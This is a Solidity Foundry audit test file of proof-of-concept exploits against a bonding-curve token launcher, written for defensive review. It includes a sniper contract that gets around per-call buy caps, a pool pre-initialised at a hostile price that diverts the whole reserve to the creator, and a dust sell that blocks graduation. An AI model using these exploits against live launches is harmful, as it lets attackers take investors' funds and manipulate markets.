// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {BondingCurve} from "../../src/BondingCurve.sol";
import {GraduationManager} from "../../src/GraduationManager.sol";
import {HoodiumFactory} from "../../src/HoodiumFactory.sol";
import {HoodiumToken} from "../../src/HoodiumToken.sol";
import {LPLocker} from "../../src/LPLocker.sol";
import {FeeVault} from "../../src/FeeVault.sol";
import {MockUSDG} from "../mocks/MockUSDG.sol";
import {MockUniswapFactory, MockUniswapPool} from "../mocks/MockUniswap.sol";
import {INonfungiblePositionManager} from "../../src/interfaces/IUniswapV3.sol";

/*
 * Audit PoCs — curve math / rounding / economic attacks lens.
 * These are findings, not regression tests: several of them PASS by
 * demonstrating undesirable behaviour.
 */

/// A position manager that applies Uniswap v3's LiquidityAmounts math for the
/// full-range position (ticks ±887200) at the pool's current sqrt price, so the
/// "pre-initialised pool at a hostile price" scenario can be exercised.
contract PriceAwarePositionManager is ERC721 {
    using SafeERC20 for IERC20;

    uint256 constant Q96 = 1 << 96;
    // TickMath.getSqrtRatioAtTick(-887200) and (+887200)
    uint160 constant SQRT_LOWER = 4295343490;
    uint160 constant SQRT_UPPER = 1461373636630004318706518188784493106690254656249;

    MockUniswapFactory public immutable uniFactory;
    mapping(uint256 => uint128) public liquidityOf;
    mapping(uint256 => address) public token0Of;
    mapping(uint256 => address) public token1Of;
    uint256 public nextId = 1;

    constructor(MockUniswapFactory f) ERC721("PM", "PM") {
        uniFactory = f;
    }

    function _l0(uint160 sa, uint160 sb, uint256 amount0) private pure returns (uint256) {
        uint256 inter = Math.mulDiv(sa, sb, Q96);
        return Math.mulDiv(amount0, inter, sb - sa);
    }

    function _l1(uint160 sa, uint160 sb, uint256 amount1) private pure returns (uint256) {
        return Math.mulDiv(amount1, Q96, sb - sa);
    }

    function _a0(uint160 sa, uint160 sb, uint256 L) private pure returns (uint256) {
        return Math.mulDiv(L << 96, sb - sa, sb) / sa;
    }

    function _a1(uint160 sa, uint160 sb, uint256 L) private pure returns (uint256) {
        return Math.mulDiv(L, sb - sa, Q96);
    }

    function mint(INonfungiblePositionManager.MintParams calldata p)
        external
        payable
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1)
    {
        address pool = uniFactory.getPool(p.token0, p.token1, p.fee);
        uint160 sp = MockUniswapPool(pool).sqrtPriceX96();
        require(sp != 0, "not initialised");

        uint256 L;
        if (sp <= SQRT_LOWER) {
            L = _l0(SQRT_LOWER, SQRT_UPPER, p.amount0Desired);
            amount0 = _a0(SQRT_LOWER, SQRT_UPPER, L);
            amount1 = 0;
        } else if (sp < SQRT_UPPER) {
            uint256 l0 = _l0(sp, SQRT_UPPER, p.amount0Desired);
            uint256 l1 = _l1(SQRT_LOWER, sp, p.amount1Desired);
            L = l0 < l1 ? l0 : l1;
            amount0 = _a0(sp, SQRT_UPPER, L);
            amount1 = _a1(SQRT_LOWER, sp, L);
        } else {
            L = _l1(SQRT_LOWER, SQRT_UPPER, p.amount1Desired);
            amount0 = 0;
            amount1 = _a1(SQRT_LOWER, SQRT_UPPER, L);
        }
        require(amount0 <= p.amount0Desired && amount1 <= p.amount1Desired, "over");
        require(amount0 >= p.amount0Min && amount1 >= p.amount1Min, "slippage");

        if (amount0 > 0) IERC20(p.token0).safeTransferFrom(msg.sender, address(this), amount0);
        if (amount1 > 0) IERC20(p.token1).safeTransferFrom(msg.sender, address(this), amount1);

        tokenId = nextId++;
        liquidity = uint128(L);
        liquidityOf[tokenId] = liquidity;
        token0Of[tokenId] = p.token0;
        token1Of[tokenId] = p.token1;
        _mint(p.recipient, tokenId);
    }

    function collect(INonfungiblePositionManager.CollectParams calldata) external payable returns (uint256, uint256) {
        return (0, 0);
    }

    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96,
            address,
            address token0,
            address token1,
            uint24,
            int24,
            int24,
            uint128 liquidity,
            uint256,
            uint256,
            uint128,
            uint128
        )
    {
        token0 = token0Of[tokenId];
        token1 = token1Of[tokenId];
        liquidity = liquidityOf[tokenId];
    }
}

/// A contract that launches and immediately loops `buy()` inside the deployment
/// transaction. Each call is under the per-call snipe cap; the sum is not.
contract LaunchSniper {
    HoodiumFactory immutable factory;
    IERC20 immutable usdg;

    constructor(HoodiumFactory f, IERC20 u) {
        factory = f;
        usdg = u;
    }

    function go(uint256 devBuyUsdg, uint256 perCall, uint256 calls) external returns (address token, address curve) {
        usdg.approve(address(factory), type(uint256).max);
        (token, curve) = factory.launch("Snipe", "SNP", "ipfs://s", devBuyUsdg, 0);
        usdg.approve(curve, type(uint256).max);
        for (uint256 i = 0; i < calls; i++) {
            BondingCurve(curve).buy(perCall, 0);
        }
    }
}

contract CurveEconomicsAudit is Test {
    uint256 constant USDG_UNIT = 1e6;
    uint256 constant TOKEN_UNIT = 1e18;
    uint256 constant TOTAL_SUPPLY = 1_000_000_000 * TOKEN_UNIT;
    uint256 constant CURVE_ALLOCATION = 800_000_000 * TOKEN_UNIT;
    uint256 constant VIRTUAL_USDG = 12_000 * USDG_UNIT;
    uint256 constant GRADUATION_TARGET = 69_000 * USDG_UNIT;

    MockUSDG usdg;
    FeeVault vault;
    MockUniswapFactory uniFactory;
    PriceAwarePositionManager pm;
    LPLocker locker;
    GraduationManager manager;
    HoodiumFactory factory;
    HoodiumToken token;
    BondingCurve curve;

    address creator = makeAddr("creator");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        usdg = new MockUSDG();
        address[] memory owners = new address[](2);
        owners[0] = makeAddr("s1");
        owners[1] = makeAddr("s2");
        vault = new FeeVault(owners, 2);
        uniFactory = new MockUniswapFactory();
        pm = new PriceAwarePositionManager(uniFactory);
        locker = new LPLocker(address(pm), address(vault), 3_000);
        manager = new GraduationManager(address(uniFactory), address(pm), address(locker), address(usdg), 10_000, 200);
        factory = new HoodiumFactory(
            HoodiumFactory.FactoryConfig({
                usdg: address(usdg),
                feeVault: address(vault),
                graduationManager: address(manager),
                tokenDecimals: 18,
                totalSupply: TOTAL_SUPPLY,
                curveAllocation: CURVE_ALLOCATION,
                virtualUsdg: VIRTUAL_USDG,
                graduationTarget: GRADUATION_TARGET,
                graduationFee: 0,
                tradeFeeBps: 100,
                creatorFeeShareBps: 7_000,
                creationFee: 0,
                devBuyMaxBps: 500,
                snipeBlocks: 3,
                snipeMaxBps: 100
            })
        );
        vm.prank(creator);
        (address t, address c) = factory.launch("Grad", "GRAD", "ipfs://x", 0, 0);
        token = HoodiumToken(t);
        curve = BondingCurve(c);
        vm.roll(block.number + 4);
    }

    function _buy(address who, uint256 amount) internal returns (uint256 out) {
        usdg.mint(who, amount);
        vm.startPrank(who);
        usdg.approve(address(curve), amount);
        out = curve.buy(amount, 0);
        vm.stopPrank();
    }

    function _sell(address who, uint256 amount) internal returns (uint256 out) {
        vm.startPrank(who);
        token.approve(address(curve), amount);
        out = curve.sell(amount, 0);
        vm.stopPrank();
    }

    // ── F1: a pre-initialised pool sends the whole USDG reserve to the creator ──
    function test_audit_F1_preInitialisedPool_refundsAllUsdgToCreator() public {
        // Creator (or anyone) creates + initialises the pool before graduation at
        // a price outside the full-range position's bounds on the USDG side.
        bool usdgIsToken1 = address(token) < address(usdg);
        (address t0, address t1) = usdgIsToken1 ? (address(token), address(usdg)) : (address(usdg), address(token));
        address pool = uniFactory.createPool(t0, t1, 10_000);
        // price <= lower bound => only token0 deposited; price >= upper => only token1.
        MockUniswapPool(pool).initialize(usdgIsToken1 ? 4295128739 : 1461446703485210103287273052203988822378723970341);

        _buy(alice, 200_000 * USDG_UNIT);
        assertTrue(curve.curveComplete());
        uint256 reserve = curve.reserveUsdg();
        assertEq(reserve, GRADUATION_TARGET);

        uint256 creatorBefore = usdg.balanceOf(creator);
        vm.prank(bob);
        curve.graduate();

        uint256 refunded = usdg.balanceOf(creator) - creatorBefore;
        console2.log("USDG reserve at graduation:", reserve);
        console2.log("USDG handed to creator     :", refunded);
        console2.log("USDG in pool               :", usdg.balanceOf(address(pm)));
        assertEq(refunded, reserve, "creator received the entire USDG reserve");
        assertEq(usdg.balanceOf(address(pm)), 0, "pool got no USDG");
    }

    // ── F2: graduate() is blockable at ~zero cost by a dust sell ──────────────
    function test_audit_F2_dustSellBlocksGraduation() public {
        _buy(bob, 100 * USDG_UNIT); // bob holds a few tokens
        _buy(alice, 200_000 * USDG_UNIT);
        assertTrue(curve.curveComplete());

        // bob front-runs graduate() with a sell of 1 token (1e18 wei).
        uint256 out = _sell(bob, 1 * TOKEN_UNIT);
        console2.log("bob's proceeds for the blocking sell (USDG units):", out);
        console2.log("reserve short of target by (USDG units):", curve.remainingToTarget());
        assertFalse(curve.curveComplete());

        vm.expectRevert(BondingCurve.TargetNotReached.selector);
        curve.graduate();

        // and it is repeatable for as long as bob holds dust
        _buy(alice, 10 * USDG_UNIT); // someone tops it back up (clamped to remaining)
        assertTrue(curve.curveComplete());
        _sell(bob, 1 * TOKEN_UNIT);
        vm.expectRevert(BondingCurve.TargetNotReached.selector);
        curve.graduate();
    }

    // ── F3: dev-buy cap and anti-snipe cap are per-call, not per-tx/per-address ─
    function test_audit_F3_contractLoopBypassesDevBuyAndSnipeCaps() public {
        LaunchSniper sniper = new LaunchSniper(factory, IERC20(address(usdg)));
        usdg.mint(address(sniper), 100_000 * USDG_UNIT);

        uint256 devBuyCap = factory.devBuyCapTokens(); // 5% of supply
        uint256 snipeCap = TOTAL_SUPPLY * 100 / 10_000; // 1% of supply per call

        // 650 USDG dev buy (under the 5% cap) + 120 loop buys of 100 USDG each,
        // all inside the deployment tx, in the deploy block.
        (address t, address c) = sniper.go(650 * USDG_UNIT, 100 * USDG_UNIT, 120);
        uint256 held = HoodiumToken(t).balanceOf(address(sniper));
        uint256 spent = 100_000 * USDG_UNIT - usdg.balanceOf(address(sniper));

        console2.log("dev buy cap (tokens)  :", devBuyCap);
        console2.log("snipe cap per call    :", snipeCap);
        console2.log("sniper holds (tokens) :", held);
        console2.log("sniper holds % supply :", held * 100 / TOTAL_SUPPLY);
        console2.log("USDG spent            :", spent);
        console2.log("curve reserve         :", BondingCurve(c).reserveUsdg());
        assertGt(held, devBuyCap * 6, "more than 30% of supply captured in the deploy tx");
    }

    // ── F4: the pool opens far below the curve's closing price ───────────────
    function test_audit_F4_poolOpensBelowCurveClosingPrice() public {
        _buy(alice, 200_000 * USDG_UNIT);
        assertTrue(curve.curveComplete());

        // Marginal curve price at the end, from the sell side: sell 1000 tokens.
        (, , uint256 grossOut) = curve.quoteSell(1000 * TOKEN_UNIT);
        // USDG per token * 1e18 (scaled) — both prices in USDG units per 1e18 token wei
        uint256 curvePriceE18 = grossOut * TOKEN_UNIT / (1000 * TOKEN_UNIT);

        uint256 usdgForLp = curve.reserveUsdg() - curve.graduationFee();
        uint256 tokensForLp = curve.lpAllocation() + (curve.curveAllocation() - curve.tokensSold());
        uint256 poolPriceE18 = usdgForLp * TOKEN_UNIT / tokensForLp;

        console2.log("curve closing price (USDG units per token, x1e18):", curvePriceE18 * TOKEN_UNIT / TOKEN_UNIT);
        console2.log("pool opening price  (USDG units per token, x1e18):", poolPriceE18);
        console2.log("pool/curve price ratio (bps):", poolPriceE18 * 10_000 / curvePriceE18);
        console2.log("unsold curve tokens at target (wei):", curve.curveAllocation() - curve.tokensSold());
        console2.log("lpAllocation for price continuity would be:", curve.virtualTokens() * usdgForLp / curve.reserveX());
        assertLt(poolPriceE18 * 10_000 / curvePriceE18, 6_500, "pool opens >35% below the curve's last price");
    }

    // ── S1 (sound): dust buys near the opening price cannot drift the reserve ─
    function test_audit_S1_dustBuySellNearOpening_noDrift() public {
        uint256 kBefore = curve.currentK();
        uint256 balBefore = usdg.balanceOf(address(curve));
        for (uint256 i = 0; i < 200; i++) {
            uint256 amount = 2 + (i % 5);
            uint256 out = _buy(alice, amount);
            if (out > 0) _sell(alice, out);
        }
        uint256 owed = curve.creatorFeesAccrued() + curve.platformFeesAccrued();
        assertGe(curve.currentK(), kBefore);
        assertEq(usdg.balanceOf(address(curve)), curve.reserveUsdg() + owed);
        assertGe(usdg.balanceOf(address(curve)), balBefore);
    }

    // ── S2 (sound): tokensSold never exceeds curveAllocation, reserve never
    // exceeds target, even through many sell/buy cycles ──────────────────────
    function testFuzz_audit_S2_boundsHold(uint96[10] memory amts, bool[10] memory sells) public {
        for (uint256 i = 0; i < 10; i++) {
            if (sells[i]) {
                uint256 held = token.balanceOf(alice);
                if (held == 0) continue;
                _sell(alice, bound(amts[i], 1, held));
            } else {
                if (curve.curveComplete()) continue;
                _buy(alice, bound(amts[i], 2, 80_000 * USDG_UNIT));
            }
            assertLe(curve.tokensSold(), CURVE_ALLOCATION);
            assertLe(curve.reserveUsdg(), GRADUATION_TARGET);
            assertGe(curve.currentK(), curve.initialK());
        }
    }
}
